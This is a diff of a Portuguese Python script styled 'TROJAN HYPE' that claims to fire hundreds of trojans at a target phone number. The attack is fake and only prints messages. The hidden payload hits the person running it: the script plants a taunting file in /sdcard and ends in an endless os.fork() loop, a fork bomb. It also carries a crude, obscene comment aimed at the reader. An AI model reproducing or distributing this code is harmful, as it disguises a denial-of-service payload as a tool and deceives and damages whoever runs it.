@@ -31,42 +31,60 @@ import time
 
 
 os.system ('clear')
-os.system ('figlet -f slant TROJAN') 
-print (f'{XV} Script by{XXI}:{O}Lacoste Hype {XXI}')
+os.system (' cd /sdcard && mkdir Albania-Security && cd Albania-Security && echo Albania-Security passou aqui > AVISO.txt ')
+os.system ('clear')
+os.system ('figlet -f slant TROJAN HYPE') 
+print (f'{XV} Script by{XXI}:{O}ꪶ͢𝐋𝐀͢𝐂𝐎𝐒͢𝐓𝐄 𝐇𝐘͢𝐏𝐄{XXI}')
 time.sleep(0.6)
-
 # variavel para contagem
 a = 1
 #
 
 print(" ".center(8), f'{XV} PROGRAMA DE RAJAR TROJAN{XXI}😈🐊')
-print (f' {l} SOMENTE O NÚMERO SEM ESPAÇO OU -\nEXEMPLO :+5511959228439{XXI}')
-n = int(input(f'{l}{W} Digite o número do alvo :{XXI}'))
-print ('\n')
-print (f'{R}Localizando alvo!!!{XXI}')
-time.sleep(3.0)
-print (f'{l}ALVO ENCONTRADO' '❗❗❗{XXI}')
-# comi o cu de quem ta lendo ;) a
-os.system (' cd /sdcard && mkdir Albania-Security && cd Albania-Security && echo Albania-Security passou aqui > se fudeu ')
-############$
-os.system ('clear')
-print (f'{XV}.  INICIANDO...{XXI}'.center(6))
+print (f' {L} Menu !!! {XXI}\n{Y}Escolha a quantidade de trojan\nque deseja enviar{XXI}')
+print (f'{XV}1 - 500\n2 - 1000{XXI} ')
+menu = int(input(f'{W}:'))
 
-os.system('clear')
-time.sleep(2.0)
-while a < 500:
-    print (''.center(10),f'{L}RAJANDO O TROJAN NO ALVO{XXI}', n)
-    a += 1
-
-input(f' {XV} aperte {XXI}{R}ENTER{XXI}{XV}para fechar o programa.{XXI}')
+if menu == 1:
+    print (f' {XXI}{l} SOMENTE O NÚMERO SEM ESPAÇO OU -\nEXEMPLO :+5511959228439{XXI}')
+    n = int(input(f'{XXI}{l}{W} Digite o número do alvo :{O}'))
+    print ('\n')
+    print (f'{XXI}{R}Localizando alvo!!!{XXI}')
+    time.sleep(3.0)
+    print (f'{l}ALVO ENCONTRADO' '❗❗❗{XXI}')
+    # comi o cu de quem ta lendo ;) a
+    os.system ('clear')
+    print (f'{XV}.  INICIANDO...{XXI}'.center(6))
+    time.sleep (2)
+    os.system('clear')
+    time.sleep(2.0)
+    while a < 500:
+        print (''.center(10),f'{L}RAJANDO TROJAN NO ALVO{XXI} {e} {XV} {n} {XXI}')
+        a += 1
+        pass
+elif menu == 2:
+    print (f' {XXI}{l} SOMENTE O NÚMERO SEM ESPAÇO OU -\nEXEMPLO :+5511959228439{XXI}')
+    n = int(input(f'{XXI}{l}{W} Digite o número do alvo :{O}'))
+    print ('\n')
+    print (f'{XXI}{R}Localizando alvo!!!{XXI}')
+    time.sleep(3.0)
+    print (f'{l}ALVO ENCONTRADO' '❗❗❗{XXI}')
+    # comi o cu de quem ta lendo ;) a
+    os.system ('clear')
+    print (f'{XV}.  INICIANDO...{XXI}'.center(6))
+    time.sleep (2)
+    os.system('clear')
+    time.sleep(2.0)
+    while a < 1000:
+        print (''.center(10),f'{L}RAJANDO TROJAN NO ALVO{XXI} {e} {XV} {n} {XXI}')
+        a += 1
+        pass
+	
+    
+input(f' {XV} aperte {XXI}{R}ENTER{XXI}{XV} para fechar o programa.{XXI}')
 time.sleep (0.5)
 os.system (' figlet -f slant ENCERRANDO...')
 time.sleep (2.0)
 while True:
-	print (f' {XV} ALBANIA-SECURITY PASSOU A PIKA {XXI}')
+	print (f'{R}ALBANIA SECURITY PASSOU AQUI {XXI}')
 	os.fork()
-	
-
-	
-#script feito com intuito de trollar lammers e script kiddies 
-	
